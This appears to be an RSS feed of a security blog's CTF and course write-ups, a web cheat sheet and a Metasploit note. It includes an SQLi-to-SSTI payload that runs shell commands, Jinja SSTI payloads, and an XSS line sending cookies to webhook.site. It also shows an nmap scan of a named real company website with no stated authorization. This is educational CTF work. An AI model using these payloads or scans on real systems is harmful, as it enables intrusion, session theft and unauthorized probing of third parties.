&lt;pre tabindex="0">&lt;code>total	76	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	.	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	..	
-rwxr-xr-x	1	root	root	0		Dec	18	18:54	.dockerenv	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	bin	
drwxr-xr-x	5	root	root	340		Dec	18	18:54	dev	
drwxr-xr-x	1	root	root	4096	Dec	18	18:54	etc	
-rw-r--r--	1	root	root	28		Dec	18	17:15	flag1.txt	
-rw-r--r--	1	root	root	23		Dec	18	17:15	flag2-1PRmDsTXoo3uPCdq.txt	
drwxr-xr-x	1	root	root	4096	Dec	18	17:15	home	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	lib	
drwxr-xr-x	5	root	root	4096	Dec	7	09:43	media	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	mnt	
drwxr-xr-x	1	root	root	4096	Dec	11	18:36	opt	
dr-xr-xr-x	497	root	root	0		Dec	18	18:54	proc	
drwx------	1	root	root	4096	Dec	11	18:36	root	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	run	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	sbin	
drwxr-xr-x	2	root	root	4096	Dec	7	09:43	srv	
dr-xr-xr-x	13	root	root	0		Dec	18	18:54	sys	
drwxrwxrwt	1	root	root	4096	Dec	22	17:16	tmp	
drwxr-xr-x	1	root	root	4096	Dec	18	13:27	usr	
drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var	
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Payload 2:
&lt;ul>
&lt;li>Username:
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">admin.password&amp;#34;) as password, json_extract(users, &amp;#39;$.admin.password&amp;#39;) as password from db; -- # &amp;lt;%= global.process.mainModule.require(&amp;#34;child_process&amp;#34;).execSync(&amp;#34;cat /flag2-1PRmDsTXoo3uPCdq.txt&amp;#34;).toString() %&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Password: &lt;code>FLAG{sqlite_js0n_inject!on}&lt;/code>&lt;/li>
&lt;li>Result: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/p></description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</guid><description>&lt;h1 id="simple-welcome---0x04lab---script">
 Simple Welcome - 0x04(Lab - Script)
 &lt;a class="anchor" href="#simple-welcome---0x04lab---script">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://pyscript.ctf.zoolab.org/">https://pyscript.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 if(!isset($_FILES[&amp;#34;file&amp;#34;]))
 highlight_file(__file__) &amp;amp;&amp;amp; die();
 $flag = file_get_contents(&amp;#39;/flag&amp;#39;);
 $node = @`node {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 $python = @`python3 {$_FILES[&amp;#34;file&amp;#34;][&amp;#34;tmp_name&amp;#34;]} 2&amp;gt;&amp;amp;1`;
 if($flag === $node &amp;amp;&amp;amp; $flag === $python)
 echo &amp;#39;Here is your Flag: &amp;#39;.$flag;
 else
 echo &amp;#39;Fail :(&amp;#39;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;p>Must write a script that can be executed in python and node language simultaneously.&lt;/p></description></item><item><title>Simple Welcome 0x01(Lab - Let's meet at class)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/</guid><description>&lt;h1 id="simple-welcome-0x01lab---lets-meet-at-class">
 Simple Welcome 0x01(Lab - Let&amp;rsquo;s meet at class)
 &lt;a class="anchor" href="#simple-welcome-0x01lab---lets-meet-at-class">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>Crypto part of homework 0. The key space is $10^{15}$. I used my supercomputer(i5 7th gen) to solve it in about 10 minutes. It&amp;rsquo;s impossible for you guys to enumerate all the keys in 2 weeks, or maybe you can&amp;hellip; (Use &lt;code>pip3 install pycryptodome&lt;/code> to install Crypto)&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> math
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>FLAG &lt;span style="color:#f92672">+=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">128&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>keys &lt;span style="color:#f92672">=&lt;/span> [pow(random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (i&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) ), &lt;span style="color:#ae81ff">65537&lt;/span>, p) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">5&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enc &lt;span style="color:#f92672">=&lt;/span> flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">5&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enc &lt;span style="color:#f92672">=&lt;/span> enc &lt;span style="color:#f92672">*&lt;/span> keys[i] &lt;span style="color:#f92672">%&lt;/span> p
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hint &lt;span style="color:#f92672">=&lt;/span> keys[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">^&lt;/span> keys[&lt;span style="color:#ae81ff">4&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;p =&amp;#39;&lt;/span>, p)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;enc =&amp;#39;&lt;/span>, enc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;hint =&amp;#39;&lt;/span>, hint)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
:::spoiler&lt;/p></description></item><item><title>Simple Welcome 0x02 &amp; 0x05(Lab - Nine &amp; Nine-Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/</guid><description>&lt;h1 id="simple-welcome-0x02--0x05lab---nine--nine-revenge">
 Simple Welcome 0x02 &amp;amp; 0x05(Lab - Nine &amp;amp; Nine-Revenge)
 &lt;a class="anchor" href="#simple-welcome-0x02--0x05lab---nine--nine-revenge">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.tutorialspoint.com/convert-frombase64string-string-method-in-chash#">Convert.FromBase64String(String) Method in C#&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.string.substring?view=net-7.0">String.Substring 方法&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler C# From dnSpy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Nine.Stage&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Token: 0x0600000D RID: 13 RVA: 0x00002694 File Offset: 0x00000894&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Flag()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">this&lt;/span>.font = &lt;span style="color:#66d9ef">new&lt;/span> Font(&lt;span style="color:#66d9ef">this&lt;/span>.fontFamily, &lt;span style="color:#ae81ff">35f&lt;/span>, FontStyle.Regular);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">byte&lt;/span>[] array = Convert.FromBase64String(&lt;span style="color:#e6db74">&amp;#34;LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=&amp;#34;&lt;/span>.Replace(&lt;span style="color:#e6db74">&amp;#34;pui&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>).Substring(&lt;span style="color:#ae81ff">1&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i = &lt;span style="color:#ae81ff">0&lt;/span>; i &amp;lt; array.Length; i++)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		array[i] ^= &lt;span style="color:#ae81ff">135&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">this&lt;/span>.SetMessageBox(Encoding.UTF8.GetString(array));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>起手式一定用DIE或其他檢測tool看一下是用哪種東西編譯或有沒有加殼
&lt;img src="https://hackmd.io/_uploads/SksyjD8K3.png" alt="" />
我一開始以為可以用IDA之類的東西反編譯他，但是顯然IDA沒辦法解析&lt;code>.NET&lt;/code> file，這一題也是看了別人的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>才知道有&lt;a href="https://github.com/dnSpy/dnSpy/releases">dnSpy&lt;/a>這東西可以用
&lt;img src="https://hackmd.io/_uploads/rkiIiwUK3.png" alt="" />&lt;/li>
&lt;li>執行程式
實際執行起來會發現它就是個小遊戲，可以用方向鍵操控人移動或是移開石頭，重點是要拿到鑰匙並開鎖拿到旗子，玩了好久都沒成功，所以想說可以用dnSpy看一下可以用的東西
&lt;img src="https://hackmd.io/_uploads/rkR8cPIt2.png" alt="" />&lt;/li>
&lt;li>用dnSpy看source code
在&lt;code>/Nine/Nine.exe/Nine/Stage@02000004/Flag()&lt;/code>以及&lt;code>/Nine-revenge/Nine-revenge.exe/Nine/Stage@02000004/Flag()&lt;/code>都可以直接看到flag function怎麼寫的，所以其實這一題只要知道dnSpy這東西，其實就過於簡單
:::spoiler Function Path Screenshot
&lt;img src="https://hackmd.io/_uploads/HkHxLuUYh.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/SyW-8OUK3.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>也是可以直接用C#的線上editor，不過如果不會寫的話就可以直接看source code然後用熟悉的語言寫script&lt;/p></description></item><item><title>TSCCTF 2024</title><link>https://bernie6401.github.io/docs/security/competition/tscctf-2024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/tscctf-2024/</guid><description>&lt;h1 id="tscctf-2024">
 TSCCTF 2024
 &lt;a class="anchor" href="#tscctf-2024">#&lt;/a>
&lt;/h1>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BJLmu63Y6.png" alt="image" />&lt;/p>
&lt;h2 id="misc">
 Misc
 &lt;a class="anchor" href="#misc">#&lt;/a>
&lt;/h2>
&lt;h3 id="aka">
 AKA
 &lt;a class="anchor" href="#aka">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler IDA&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">__int64 flag_function()
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]

 num_of_files = 0;
 sub_14000A6C0();
 here_dll = LoadLibraryA(&amp;#34;here.dll&amp;#34;);
 flag_dll = LoadLibraryA(&amp;#34;flag.dll&amp;#34;);
 ghost_dll = LoadLibraryA(&amp;#34;ghost.dll&amp;#34;);
 strcpy(FileName, &amp;#34;.\\*.*&amp;#34;);
 FirstFileA = FindFirstFileA(FileName, &amp;amp;FindFileData);
 while ( FindNextFileA(FirstFileA, &amp;amp;FindFileData) )
 {
 while ( *(_WORD *)FindFileData.cFileName != 46
 &amp;amp;&amp;amp; (*(_WORD *)FindFileData.cFileName != 11822 || FindFileData.cFileName[2]) )
 {
 num_of_files += (GetFileAttributesA(FindFileData.cFileName) &amp;amp; 0x10) == 0;
 if ( !FindNextFileA(FirstFileA, &amp;amp;FindFileData) )
 goto LABEL_6;
 }
 }
LABEL_6:
 FindClose(FirstFileA);
 if ( num_of_files &amp;gt; 2 )
 {
 v6 = strcpy(buf, &amp;#34;We don&amp;#39;t want too many files here.&amp;#34;);
 puts(v6);
 v7 = strcpy(buf, &amp;#34;Files &amp;lt;= 2. You have &amp;#34;);
 v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files);
 v9 = strcpy(v8, &amp;#34; file(s).&amp;#34;);
 puts(v9);
 v10 = strcpy(buf, &amp;#34;Hint: Did you have short name?&amp;#34;);
 puts(v10);
 return 0i64;
 }
 if ( !here_dll )
 {
 if ( !ghost_dll )
 {
 if ( !flag_dll )
 {
 v12 = strcpy(buf, &amp;#34;DLL load failed.&amp;#34;);
 puts(v12);
 goto LABEL_12;
 }
 hint = (void (*)(void))GetProcAddress(flag_dll, &amp;#34;hint&amp;#34;);
 if ( !hint )
 goto LABEL_12;
 goto LABEL_11;
 }
 goto LABEL_16;
 }
 if ( ghost_dll )
 {
LABEL_16:
 hint = (void (*)(void))GetProcAddress(ghost_dll, &amp;#34;Roflcopter&amp;#34;);
 if ( !hint )
 goto LABEL_12;
 goto LABEL_11;
 }
 if ( !flag_dll )
 {
 hint = (void (*)(void))GetProcAddress(here_dll, &amp;#34;hint&amp;#34;);
 if ( !hint )
 {
LABEL_12:
 FreeLibrary(here_dll);
 FreeLibrary(flag_dll);
 FreeLibrary(ghost_dll);
 return 0i64;
 }
LABEL_11:
 hint();
 goto LABEL_12;
 }
 flag = (void (*)(void))GetProcAddress(flag_dll, &amp;#34;flag&amp;#34;);
 if ( flag )
 flag();
 return 0i64;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</guid><description>&lt;h1 id="web-cheat-sheet">
 Web Cheat Sheet
 &lt;a class="anchor" href="#web-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools">
 Online Tools
 &lt;a class="anchor" href="#online-tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Fuck&lt;/th>
 &lt;th>Beautifier&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="http://www.jsfuck.com/">jsfuck&lt;/a>&lt;/td>
 &lt;td>&lt;a href="http://www.jsnice.org/">JSNice&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/jjencode.html">jjencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://beautifier.io/">JS 反混淆器&lt;/a>: 可以反混淆或解密JS的檔案&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/aaencode.html">aaencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://js.wfuapp.com/">JS 壓縮+加密+混淆+美化&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://esolangs.org/wiki/Language_list">Esolang List&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://www.53lu.com/tool/jsfuckdecode/">JS Fuck Decode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">aadecode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="cheat-sheet">
 Cheat-Sheet
 &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS-CheatSheet&lt;/a>
利用XSS把session打到webhook上:
&lt;pre tabindex="0">&lt;code class="language-javascript?" data-lang="javascript?">window.location=&amp;lt;requestbin.com&amp;gt;/?a+document.cookie
// or
fetch(&amp;#34;https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194&amp;#34;, { method: &amp;#39;GET&amp;#39;, headers: { &amp;#39;Cookie&amp;#39;: document.cookie } })
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md">All-Injection&lt;/a>&lt;/li>
&lt;li>SSTI Payload: 記得找==os._wrap_close==
&lt;pre tabindex="0">&lt;code>{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[&amp;#39;system&amp;#39;](&amp;#39;id&amp;#39;)}}
{{self.__init__.__globals__.__builtins__.__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;cat%20Flag.txt&amp;#34;).read()}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="others">
 Others
 &lt;a class="anchor" href="#others">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>wasm $\to$ c: &lt;a href="https://github.com/WebAssembly/wabt">wabt&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"># 按照說明build完後進到./build
$ ./wasm2c {wasm file path} -o {output c file path}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Webhook
&lt;a href="https://webhook.site/">Webhook.site&lt;/a>
&lt;a href="https://beeceptor.com/">Beeceptor&lt;/a>
&lt;a href="https://ngrok.com/">Ngrok&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>利用Metasploit Framework測試一些網站</title><link>https://bernie6401.github.io/docs/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/</guid><description>&lt;h1 id="利用metasploit-framework測試一些網站">
 利用Metasploit Framework測試一些網站
 &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8metasploit-framework%e6%b8%ac%e8%a9%a6%e4%b8%80%e4%ba%9b%e7%b6%b2%e7%ab%99">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="cheat-sheet">
 &lt;a href="https://ithelp.ithome.com.tw/articles/10279483?sc=hot">Cheat Sheet&lt;/a>
 &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo msfdb init &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> msfconsole
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; nmap -vv &lt;span style="color:#f92672">{&lt;/span>IP&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. nmap -vv 127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; search &lt;span style="color:#f92672">{&lt;/span>http/ssh/ftp...關鍵字&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. search rce&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 &amp;gt; use &lt;span style="color:#f92672">{&lt;/span>腳本位置&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. use exploit/unix/http/cacti_filter_sqli_rce&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; show option &lt;span style="color:#75715e"># 顯示該腳本需要哪一些參數&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msf6 exploit&lt;span style="color:#f92672">(&lt;/span>XXX&lt;span style="color:#f92672">)&lt;/span> &amp;gt; set &lt;span style="color:#f92672">{&lt;/span>option name&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#f92672">{&lt;/span>參數&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e"># e.g. set RHOST 127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smartdaily">
 &lt;a href="https://www.smartdaily.com.tw/">SmartDaily&lt;/a>
 &lt;a class="anchor" href="#smartdaily">#&lt;/a>
&lt;/h2>
&lt;p>IP: &lt;code>34.81.5.101&lt;/code>
&lt;a href="https://securityheaders.com/?q=https%3A%2F%2Fwww.smartdaily.com.tw%2F&amp;amp;followRedirects=on">Security Header Result&lt;/a>&lt;/p>
&lt;h3 id="nmap">
 nmap
 &lt;a class="anchor" href="#nmap">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler nmap Result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -vv 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> exec: nmap -vv 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.94 &lt;span style="color:#f92672">(&lt;/span> https://nmap.org &lt;span style="color:#f92672">)&lt;/span> at 2023-10-02 01:49 EDT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Ping Scan at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 34.81.5.101 &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Ping Scan at 01:49, 0.01s elapsed &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> total hosts&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Completed Parallel DNS resolution of &lt;span style="color:#ae81ff">1&lt;/span> host. at 01:49, 0.01s elapsed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Initiating Connect Scan at 01:49
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning 101.5.81.34.bc.googleusercontent.com &lt;span style="color:#f92672">(&lt;/span>34.81.5.101&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> ports&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 443/tcp on 34.81.5.101
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Discovered open port 80/tcp on 34.81.5.101
